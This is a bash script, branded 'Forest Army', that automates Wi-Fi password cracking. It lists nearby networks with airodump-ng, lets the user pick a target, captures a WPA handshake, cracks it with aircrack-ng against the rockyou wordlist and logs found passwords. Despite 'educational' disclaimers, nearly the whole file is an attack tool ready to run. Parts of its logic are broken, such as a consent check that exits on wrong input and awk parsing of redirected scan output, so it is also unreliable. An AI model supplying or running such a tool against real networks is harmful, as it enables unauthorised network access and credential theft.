#!/bin/bash

# Password protection
PASSWORD="I USE THIS AT MY OWN RISK"
echo -n "PLEASE ENTER PASSWORD & CONSENT: "
read -s INPUT
echo
if [ "$INPUT" != "$PASSWORD" ]; then
    echo "Alright! You Agreed To Continue At Your Own Risk"
    exit 1
fi

# Continue with the rest of the script
echo "Access granted."

# Clear the terminal
clear

# Display ASCII Art
echo -e "\e[32m"
echo "███████╗░█████╗░██████╗░███████╗░██████╗████████╗"
echo "██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝╚══██╔══╝"
echo "█████╗░░██║░░██║██████╔╝█████╗░░╚█████╗░░░░██║░░░"
echo "██╔══╝░░██║░░██║██╔══██╗██╔══╝░░░╚═══██╗░░░██║░░░"
echo "██║░░░░░╚█████╔╝██║░░██║███████╗██████╔╝░░░██║░░░"
echo "╚═╝░░░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═════╝░░░░╚═╝░░░"
echo
echo "░█████╗░██████╗░███╗░░░███╗██╗░░░██╗"
echo "██╔══██╗██╔══██╗████╗░████║╚██╗░██╔╝"
echo "███████║██████╔╝██╔████╔██║░╚████╔╝░"
echo "██╔══██║██╔══██╗██║╚██╔╝██║░░╚██╔╝░░"
echo "██║░░██║██║░░██║██║░╚═╝░██║░░░██║░░░"
echo "╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░╚═╝░░░"
echo -e "\e[0m"

# Script description
echo "Its Unethical If You Use On Others WiFi"
echo "Made By Forest LABS "
echo "**ONLY FOR EDUCATIONAL PURPOSES**"

# Ensure script is run with root permissions
if [ "$EUID" -ne 0 ]; then
    echo "Please run this script as root."
    exit
fi

# Step 1: Create a directory
echo "Setting up Aircrack-ng environment..."
mkdir -p ~/aircrack
cd ~/aircrack

# Step 2: Download rockyou.txt if not already present
if [ ! -f rockyou.txt ]; then
    echo "Downloading rockyou.txt wordlist..."
    wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
    echo "Wordlist downloaded."
else
    echo "rockyou.txt already exists."
fi

# Step 3: Unzip rockyou.txt if compressed
if [ -f rockyou.txt.gz ]; then
    echo "Unzipping rockyou.txt..."
    gunzip rockyou.txt.gz
fi

# Step 4: Scan for Wi-Fi networks
echo "Scanning for available Wi-Fi networks..."
echo "Press Ctrl+C when you see your target network."
sleep 2
airodump-ng wlan0 > networks.txt &
AIRODUMP_PID=$!
sleep 10 # Allow some time to gather networks
kill $AIRODUMP_PID

# Display available networks
echo "Available Wi-Fi networks:"
awk '/WPA|WEP/ {print NR " | BSSID: " $1 " | Channel: " $6 " | ESSID: " $14}' networks.txt
echo "Please select your network by entering the line number:"
read SELECTION

# Extract the selected network details
TARGET_BSSID=$(awk '/WPA|WEP/ {print NR " | " $1 " | " $6 " | " $14}' networks.txt | sed -n "${SELECTION}p" | awk '{print $3}')
TARGET_CHANNEL=$(awk '/WPA|WEP/ {print NR " | " $1 " | " $6 " | " $14}' networks.txt | sed -n "${SELECTION}p" | awk '{print $5}')
TARGET_ESSID=$(awk '/WPA|WEP/ {print NR " | " $1 " | " $6 " | " $14}' networks.txt | sed -n "${SELECTION}p" | awk '{print $7}')

echo "Selected network:"
echo "BSSID: $TARGET_BSSID"
echo "Channel: $TARGET_CHANNEL"
echo "ESSID: $TARGET_ESSID"

# Step 5: Start capturing packets
echo "Starting packet capture for $TARGET_ESSID..."
airodump-ng --bssid $TARGET_BSSID -c $TARGET_CHANNEL -w capture wlan0 &
CAPTURE_PID=$!
echo "Press Ctrl+C when handshake is captured, then press Enter to stop."
read
kill $CAPTURE_PID

# Step 6: Crack the password
echo "Starting password cracking for $TARGET_ESSID with rockyou.txt..."
PASSWORD=$(aircrack-ng -w rockyou.txt -b $TARGET_BSSID capture-01.cap | grep "KEY FOUND" | awk '{print $3}' | tr -d '[]')
if [ -n "$PASSWORD" ]; then
    echo "Password found: $PASSWORD"
    echo "Network: $TARGET_ESSID | Password: $PASSWORD" >> ~/aircrack/found_passwords.txt
    echo "Password saved in ~/aircrack/found_passwords.txt"
else
    echo "Password not found in the wordlist."
fi
